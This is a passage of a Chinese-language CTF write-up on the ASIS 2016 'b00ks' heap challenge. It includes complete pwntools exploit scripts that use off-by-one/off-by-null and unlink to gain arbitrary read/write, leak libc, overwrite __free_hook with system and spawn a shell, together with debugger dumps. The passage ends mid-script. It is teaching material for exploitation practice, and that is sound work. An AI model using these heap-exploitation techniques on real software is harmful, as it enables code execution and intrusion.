class="line">0x555555756040:0x41414141414141410x4141414141414141</span><br><span class="line">0x555555756050:0x41414141414141410x4141414141414141   &lt;&#x3D;&#x3D; author name</span><br><span class="line">0x555555756060: 0x0000555555758330 &lt;&#x3D;&#x3D; pointer array    0x0000000000000000</span><br><span class="line">0x555555756070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555756080: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">createname(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">32</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment"># getshell用随带也先申请，对本步没有影响</span></span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h5 id="伪造结构体"><a href="#伪造结构体" class="headerlink" title="伪造结构体"></a>伪造结构体</h5><p>程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 book1 的低字节。</p><p>覆盖掉 book1 指针的低字节后，这个指针会指向 book1 的 description [^4]，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book 结构，这个 book 结构的 description 和 name 指针可以由直接控制。</p><p>[^4]:为啥刚刚好就是在 book1 desc 里面？通过调试呗。注意在 Ubuntu 16 这里无法实现指向 book1 desc ，请看结尾补充</p><p>这里在 description 中伪造了 book ，使用的数据是 <code>p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)</code> 。 </p><p>其中 book1_addr+0x38 指向 book2 的 book_name 指针的存储地址；book1_addr+0x40 指向 book2 的 book_desc 指针的存储地址，使得我们可以任意修改 book2 指针值。</p><p><img src="img%5Coff-by-one-3.png" alt="off-by-one-3"></p><p>这样就是实现 edit book1 修改 book2 指针地址，edit book2 修改任意地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">&quot;book2_name_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr+<span class="number">0x38</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2_desc_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr+<span class="number">0x40</span>))</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(book1_addr+<span class="number">0x40</span>)+p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1,payload) <span class="comment"># write fakechunk</span></span><br></pre></td></tr></table></figure><h5 id="泄露-libc-地址"><a href="#泄露-libc-地址" class="headerlink" title="泄露 libc 地址"></a>泄露 libc 地址</h5><p>前面我们已经获得了任意地址读写的能力，下面的操作是显而易见的，比如写 got 表劫持流程或者写 __malloc_hook 劫持流程等。但是这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此我们还需要想一下其他的办法。</p><p>这道题的巧妙之处在于在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /4gx 0x0000555555758360</span></span><br><span class="line">0x555555758360:0x00000000000000020x00007ffff7fbc010</span><br><span class="line">0x555555758370:0x00007ffff7f9a0100x0000000000021000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555556000 r-xp     2000 0      /home/skye/Desktop/CTF学习/chunk/asis-ctf-2016-b00ks/b00ks</span><br><span class="line">    0x555555755000     0x555555756000 r--p     1000 1000   /home/skye/Desktop/CTF学习/chunk/asis-ctf-2016-b00ks/b00ks</span><br><span class="line">    0x555555756000     0x555555757000 rw-p     1000 2000   /home/skye/Desktop/CTF学习/chunk/asis-ctf-2016-b00ks/b00ks</span><br><span class="line">    0x555555757000     0x555555778000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7f9a000     0x7ffff7fe0000 rw-p    46000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><h5 id="写入-free-hook"><a href="#写入-free-hook" class="headerlink" title="写入 __free_hook"></a>写入 __free_hook</h5><p>可以写入 onegadget 也可以是 system ，如果是 system ，需要 free 的 book_name 是 /bin/sh 来传入参数。</p><h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe、CTF-WIKI</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : b00ks.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span>(<span class="params">name_size,name,des_size,des</span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">book_id=<span class="built_in">int</span>(p.readline()[:-<span class="number">1</span>])</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">book_name=p.readline()[:-<span class="number">1</span>]</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">book_des=p.readline()[:-<span class="number">1</span>]</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">book_author=p.readline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> book_id,book_name,book_des,book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span>(<span class="params">name</span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span>(<span class="params">name</span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span>(<span class="params">book_id,new_des</span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span>(<span class="params">book_id</span>):</span></span><br><span class="line">p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak chunk1_stuct addr</span></span><br><span class="line">createname(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x0B94)&quot;)</span></span><br><span class="line">createbook(<span class="number">128</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">32</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;d&quot;</span>*<span class="number">8</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set fake chunk</span></span><br><span class="line">log.success(<span class="string">&quot;book2_name_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr+<span class="number">0x38</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2_desc_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr+<span class="number">0x40</span>))</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(book1_addr+<span class="number">0x40</span>)+p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite chunk1_stuct addr 2 fake chunk</span></span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr=u64(book_name.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2 name addr:&quot;</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">&quot;book2 des addr:&quot;</span>+<span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5b6010</span><span class="comment">#0x5b9010</span></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ne_gadget=libc_base+0x4f3c2 #0x4f2c5 0x10a38c 0x4f322</span></span><br><span class="line"><span class="string">log.success(&quot;one_gadget:&quot;+hex(one_gadget))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_hook</span></span><br><span class="line"><span class="comment"># set chunk2_desc 2 free_hook</span></span><br><span class="line">editbook(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"><span class="comment"># overwrite free_hook 2 system</span></span><br><span class="line">editbook(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="在Ubuntu16下出现情况"><a href="#在Ubuntu16下出现情况" class="headerlink" title="在Ubuntu16下出现情况"></a>在Ubuntu16下出现情况</h5><p>book1 结构体覆盖后指向的地址非常低，指向的地址变成是在一个莫名其妙的 chunk 里面无法实现伪造。</p><p><img src="img%5Coff-by-one-4.png" alt="off-by-one-4"></p><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><blockquote><p>unlink就是wiki上的简便方法</p></blockquote><p>基于前面 off-by-one ，或者具体一点是 off-by-null ，溢出一个空字节，总结一下题目情况：</p><ul><li>程序中只要运用到自定义输入函数 my_read 就会存在溢出，溢出长度根据各个函数有所不同：处理 name 会溢出两个字节，其中一个字节是可控；其他函数会造成 off-by-null 。</li></ul><blockquote><p>如果刚刚入门学习 堆 题目，这里会比较绕，需要到 CTF-wiki 上把现代 unlink 攻击方法了解一下。</p></blockquote><h5 id="攻击过程概述"><a href="#攻击过程概述" class="headerlink" title="攻击过程概述"></a>攻击过程概述</h5><ol><li>泄露 chunk 地址（这步和上面方法一样）</li><li>调整堆中结构，以便完成 unlink 。完成后我们就可以修改 chunk 4 的结构体。</li><li>将 chunk 4 结构体两个结构体指针分别指向 main_area 和 chunk 6 *desc ，这样我们就能泄露 libc 地址和获得一个任意读写的指针。</li><li>修改 chunk6 *desc 的指针为 __free_hook ；接着修改 __free_hook 为 system （或 onegadget ）。</li></ol><h6 id="泄露-chunk-地址"><a href="#泄露-chunk-地址" class="headerlink" title="泄露 chunk 地址"></a>泄露 chunk 地址</h6><p>方法还是和前面一样，写入 0x20 的 author name ，然后申请一个 chunk 将 author name 的结束符覆盖掉。就能从 author name 泄露 chunk 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>.ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show()</span><br></pre></td></tr></table></figure><h6 id="调整堆结构"><a href="#调整堆结构" class="headerlink" title="调整堆结构"></a>调整堆结构</h6><p>我们需要使用的是现代 unlink 需要伪造 fd、bk 指针。book name 限定最大 size 为 0x20 ，属于 fastbin 不会触发 unlink 合并。那么我们就把 book 456 的 desc 堆块布置到一起。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>然后申请 456 heap ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;g&#x27;</span>*<span class="number">8</span>,<span class="number">0x208</span>,<span class="string">&#x27;h&#x27;</span>*<span class="number">8</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment"># make sure chunk5size low bit is 01,or corruption (!prev)</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;i&#x27;</span>*<span class="number">8</span>,<span class="number">0x200</span>-<span class="number">0x10</span>,<span class="string">&#x27;j&#x27;</span>*<span class="number">8</span>)<span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x200</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">8</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p><strong>chunk4</strong></p><p>chunk4 desc 用来伪造 fd、bk；被修改后的结构体用来修改 chunk6  desc 的指针，形成一个任意读写。</p><p>chunk4 申请的时候注意要用到 next_chunk 的 prev_size 位，方便我们伪造。</p><p><strong>chunk5</strong></p><p>chunk5 desc 需要 size （含chunk head）最低两个字节为 0x01 ，利用 off-by-null 覆盖为 0x00 ，prev_inuse 标记前面一个 chunk 是未使用的。如果申请出来的 size 不符合标准（eg：0x10），free 的时候会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">double free or corruption (!prev)</span><br></pre></td></tr></table></figure><p>原因就是系统根据当前 chunk size 找下一个 chunk 的 prev_inuse 标志，然后我们覆盖之后改变的不只是 prev_inuse 整个size 都变了，找到的 next_chunk 也是错的。</p><p><strong>chunk6</strong></p><p>用来修改 __free_hook 。如果使用 system 将 book name 写入为 /bin/sh 就行了；使用 one_gadget 不需要。</p><h6 id="在-chunk4-内伪造一个堆"><a href="#在-chunk4-内伪造一个堆" class="headerlink" title="在 chunk4 内伪造一个堆"></a>在 chunk4 内伪造一个堆</h6><p>用的是<strong>现代 unlink</strong> 实现的效果是： *ptr = ptr-0x18 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap_base + <span class="number">0x1180</span><span class="comment"># target addr</span></span><br><span class="line">log.info(<span class="string">&quot;ptr:&quot;</span>+<span class="built_in">hex</span>(ptr))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)+ p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>) </span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1e0</span>+p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">remove(<span class="number">5</span>)<span class="comment"># unlink *ptr = ptr-0x18</span></span><br></pre></td></tr></table></figure><p>unlink 之后 chunk4 desc 指针将会指向结构体自身的某个地方，具体看图调试：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-31-2MaGieFQy9X5xBZB.png"></p><h6 id="修改chunk4结构体"><a href="#修改chunk4结构体" class="headerlink" title="修改chunk4结构体"></a>修改chunk4结构体</h6><p>我选择将 book4 name 修改为存储 libc 的内存地址（也就是 book4 desc 某处）、book4 desc 修改为 chunk6 desc 指针地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x31</span>)+p64(<span class="number">0x4</span>)+p64(heap_base+<span class="number">0x11e0</span>)+p64(heap_base+<span class="number">0x10c0</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br></pre></td></tr></table></figure><h6 id="修改-free-hook"><a href="#修改-free-hook" class="headerlink" title="修改 __free_hook"></a>修改 __free_hook</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">book_size, book_name, desc_size, desc</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(book_size))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_size))</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span 